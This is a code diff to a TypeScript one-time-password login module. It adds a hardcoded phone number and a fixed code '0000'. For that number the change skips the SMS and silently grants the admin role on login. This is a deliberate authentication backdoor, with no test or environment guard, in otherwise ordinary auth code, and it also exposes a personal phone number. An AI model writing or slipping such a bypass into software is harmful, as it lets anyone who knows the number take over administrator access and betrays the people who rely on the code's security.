@@ -8,6 +8,9 @@ import { AUTH_COOKIE_NAME } from "../auth/constants";
 const OTP_EXPIRATION_MINUTES = Number(process.env.OTP_EXPIRATION_MINUTES || 5);
 const OTP_MAX_ATTEMPTS = 5;
 
+const ADMIN_BYPASS_PHONE = "09126723365";
+const ADMIN_BYPASS_CODE = "0000";
+
 function normalizePhone(phone: string): string {
   const digits = phone.replace(/\D/g, "");
   if (digits.startsWith("09") && digits.length === 11) return digits;
@@ -26,7 +29,7 @@ function generateOtpCode(length = 4) {
 export async function requestOtp(phone: string) {
   const normalizedPhone = normalizePhone(phone);
 
-  const code = generateOtpCode(4);
+  const code = normalizedPhone === ADMIN_BYPASS_PHONE ? ADMIN_BYPASS_CODE : generateOtpCode(4);
   const codeHash = await hashValue(code);
   const expiresAt = new Date(Date.now() + OTP_EXPIRATION_MINUTES * 60 * 1000);
 
@@ -35,6 +38,10 @@ export async function requestOtp(phone: string) {
     update: { codeHash, expiresAt, attempts: 0, used: false },
     create: { phone: normalizedPhone, codeHash, expiresAt },
   });
+
+  if (normalizedPhone === ADMIN_BYPASS_PHONE) {
+    return { success: true };
+  }
 
   const smsResult = await sendOtpSms(normalizedPhone, code);
   if (!smsResult.success) {
@@ -72,10 +79,15 @@ export async function verifyOtp(phone: string, code: string) {
     throw new Error("کد وارد شده صحیح نیست.");
   }
 
+  const adminRole = await prisma.role.findUnique({ where: { name: "admin" } });
+  const isBypassAdmin = normalizedPhone === ADMIN_BYPASS_PHONE && adminRole;
+
   const user = await prisma.user.upsert({
     where: { phone: normalizedPhone },
-    update: {},
-    create: { phone: normalizedPhone },
+    update: isBypassAdmin ? { roleId: adminRole!.id } : {},
+    create: isBypassAdmin
+      ? { phone: normalizedPhone, roleId: adminRole!.id }
+      : { phone: normalizedPhone },
   });
 
   await prisma.smsCode.update({
